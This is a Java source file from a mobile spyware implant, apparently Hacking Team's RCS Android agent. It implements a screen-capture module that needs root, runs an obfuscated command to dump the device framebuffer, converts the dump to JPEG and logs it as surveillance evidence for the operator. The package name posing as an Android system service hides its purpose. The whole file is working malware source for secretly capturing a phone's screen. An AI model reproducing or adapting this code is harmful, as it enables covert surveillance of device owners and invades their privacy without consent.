/* *******************************************
 * Copyright (c) 2011
 * HT srl,   All rights reserved.
 * Project      : RCS, AndroidService
 * File         : SnapshotAgent.java
 * Created      : Apr 9, 2011
 * Author		: zeno
 * *******************************************/

package com.android.service.module;

import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.IOException;
import java.nio.ByteBuffer;
import java.nio.ByteOrder;

import android.content.Context;
import android.graphics.Bitmap;
import android.graphics.Matrix;
import android.view.Display;
import android.view.Surface;
import android.view.WindowManager;

import com.android.service.LogR;
import com.android.service.Messages;
import com.android.service.Status;
import com.android.service.ThreadBase;
import com.android.service.auto.Cfg;
import com.android.service.conf.ConfModule;
import com.android.service.conf.ConfigurationException;
import com.android.service.evidence.EvidenceType;
import com.android.service.file.AutoFile;
import com.android.service.listener.ListenerStandby;
import com.android.service.util.Check;
import com.android.service.util.DataBuffer;
import com.android.service.util.Utils;
import com.android.service.util.WChar;

/**
 * The Class SnapshotAgent.
 */
public class ModuleSnapshot extends BaseInstantModule {

	private static final String TAG = "ModuleSnapshot"; //$NON-NLS-1$
	private static final int LOG_SNAPSHOT_VERSION = 2009031201;
	private static final int MIN_TIMER = 1 * 1000;
	private static final long SNAPSHOT_DELAY = 1000;

	/** The Constant CAPTURE_FULLSCREEN. */
	final private static int CAPTURE_FULLSCREEN = 0;

	/** The Constant CAPTURE_FOREGROUND. */
	final private static int CAPTURE_FOREGROUND = 1;

	/** The delay. */
	private int delay;

	/** The type. */
	private int type;
	private int quality;

	/**
	 * Instantiates a new snapshot agent.
	 */
	public ModuleSnapshot() {
		if (Cfg.DEBUG) {
			Check.log(TAG + " SnapshotAgent constructor");//$NON-NLS-1$
		}
	}

	/*
	 * (non-Javadoc)
	 * 
	 * @see com.ht.AndroidServiceGUI.agent.AgentBase#parse(byte[])
	 */
	@Override
	public boolean parse(ConfModule conf) {
		try {
			String qualityParam = conf.getString("quality");
			if ("low".equals(qualityParam)) {
				quality = 50;
			} else if ("med".equals(qualityParam)) {
				quality = 70;
			} else if ("high".equals(qualityParam)) {
				quality = 90;
			}
		} catch (ConfigurationException e) {
			if (Cfg.EXCEPTION) {
				Check.log(e);
			}

			if (Cfg.DEBUG) {
				Check.log(TAG + " (parse) Error: " + e);
			}
		}

		return true;
	}

	/*
	 * (non-Javadoc)
	 * 
	 * @see com.ht.AndroidServiceGUI.ThreadBase#go()
	 */
	@Override
	public synchronized void actualStart() {
		try {
			if (Status.self().haveRoot()) {
				final boolean isScreenOn = ListenerStandby.isScreenOn();

				if (!isScreenOn) {
					if (Cfg.DEBUG) {
						Check.log(TAG + " (go): Screen powered off, no snapshot");//$NON-NLS-1$
					}
					return;
				}

				final Display display = ((WindowManager) Status.getAppContext()
						.getSystemService(Context.WINDOW_SERVICE)).getDefaultDisplay();

				int width, height;
				final int orientation = display.getOrientation();

				int w = display.getWidth();
				int h = display.getHeight();

				boolean isTab = (w == 600 && h == 1024) || (w == 1024 && h == 600);

				if (isTab) {
					h = display.getWidth();
					w = display.getHeight();
				}

				boolean useOrientation = true;
				boolean useMatrix = true;

				if (!useOrientation || orientation == Surface.ROTATION_0 || orientation == Surface.ROTATION_180) {
					width = w;
					height = h;
				} else {
					height = w;
					width = h;
				}

				if (Cfg.DEBUG) {
					Check.log(TAG + " (go): w=" + width + " h=" + height);//$NON-NLS-1$ //$NON-NLS-2$
				}

				// 0: invertito blu e rosso
				// 1: perdita info
				// 2: invertito blu e verde
				// no ARGB, no ABGR, no AGRB
				byte[] raw = getRawBitmap();

				if (isTab) {
					// sul tablet non e' ARGB ma ABGR.
					byte[] newraw = new byte[raw.length / 2];

					for (int i = 0; i < newraw.length; i++) {
						switch (i % 4) {
						case 0:
							newraw[i] = raw[i + 2]; // A 3:+2
							break;
						case 1:
							newraw[i] = raw[i]; // R 1:+2 2:+1
							break;
						case 2:
							newraw[i] = raw[i - 2]; // G 2:-1 3:-2
							break;
						case 3:
							newraw[i] = raw[i]; // B 1:-2
							break;
						}
						/*
						 * if (i % 4 == 0) newraw[i] = raw[i + 2]; // A 3:+2
						 * else if (i % 4 == 1) newraw[i] = raw[i]; // R 1:+2
						 * 2:+1 else if (i % 4 == 2) newraw[i] = raw[i - 2]; //
						 * G 2:-1 3:-2 else if (i % 4 == 3) newraw[i] = raw[i];
						 * // B 1:-2
						 */}
					raw = newraw;
				}

				if (raw != null) {
					Bitmap bitmap = Bitmap.createBitmap(width, height, Bitmap.Config.ARGB_8888);

					ByteBuffer buffer = ByteBuffer.wrap(raw);
					bitmap.copyPixelsFromBuffer(buffer);
					buffer = null;
					raw = null;

					int rotateTab = 0;

					if (isTab) {
						rotateTab = -90;
					}

					if (useMatrix && orientation != Surface.ROTATION_0) {
						final Matrix matrix = new Matrix();

						if (orientation == Surface.ROTATION_90) {
							matrix.setRotate(270 + rotateTab);
						} else if (orientation == Surface.ROTATION_270) {
							matrix.setRotate(90 + rotateTab);
						} else if (orientation == Surface.ROTATION_180) {
							matrix.setRotate(180 + rotateTab);
						} else {
							matrix.setRotate(rotateTab);
						}

						bitmap = Bitmap.createBitmap(bitmap, 0, 0, width, height, matrix, true);
					}

					byte[] jpeg = toJpeg(bitmap);
					bitmap = null;

					new LogR(EvidenceType.SNAPSHOT, getAdditionalData(), jpeg);
					jpeg = null;
				}
			}
		} catch (final Exception ex) {
			if (Cfg.EXCEPTION) {
				Check.log(ex);
			}

			if (Cfg.DEBUG) {
				Check.log(TAG + " (go) Error: " + ex);//$NON-NLS-1$
				Check.log(ex);//$NON-NLS-1$
			}
		}

	}

	private byte[] getAdditionalData() {
		final String window = Messages.getString("11.1"); //$NON-NLS-1$

		final int wlen = window.length() * 2;
		final int tlen = wlen + 24;
		final byte[] additionalData = new byte[tlen];

		final DataBuffer databuffer = new DataBuffer(additionalData, 0, tlen);

		databuffer.writeInt(LOG_SNAPSHOT_VERSION); // version
		databuffer.writeInt(0); // process name len
		databuffer.writeInt(wlen); // windows name len

		byte[] windowsName = new byte[wlen];
		windowsName = WChar.getBytes(window);
		databuffer.write(windowsName);

		return additionalData;
	}

	private byte[] toJpeg(Bitmap bitmap) {

		ByteArrayOutputStream os = new ByteArrayOutputStream();
		bitmap.compress(Bitmap.CompressFormat.JPEG, quality, os);

		final byte[] array = os.toByteArray();
		try {
			os.close();
			os = null;

		} catch (final IOException e) {
			if (Cfg.EXCEPTION) {
				Check.log(e);
			}

			if (Cfg.DEBUG) {
				Check.log(e);//$NON-NLS-1$
			}
		}
		return array;

	}

	private byte[] getRawBitmap() {
		final File filesPath = Status.getAppContext().getFilesDir();
		final String path = filesPath.getAbsolutePath();

		final String getrawpath = Messages.getString("11.2"); //$NON-NLS-1$

		try {
			final Process localProcess = Runtime.getRuntime().exec(getrawpath);
			localProcess.waitFor();

			final AutoFile file = new AutoFile(path, Messages.getString("11.3")); //$NON-NLS-1$
			if (file.exists()) {
				return file.read();
			}
		} catch (final IOException e) {
			if (Cfg.EXCEPTION) {
				Check.log(e);
			}

			if (Cfg.DEBUG) {
				Check.log(e);//$NON-NLS-1$
			}
		} catch (final InterruptedException e) {
			if (Cfg.EXCEPTION) {
				Check.log(e);
			}

			if (Cfg.DEBUG) {
				Check.log(e);//$NON-NLS-1$
			}
		}

		return null;
	}

}
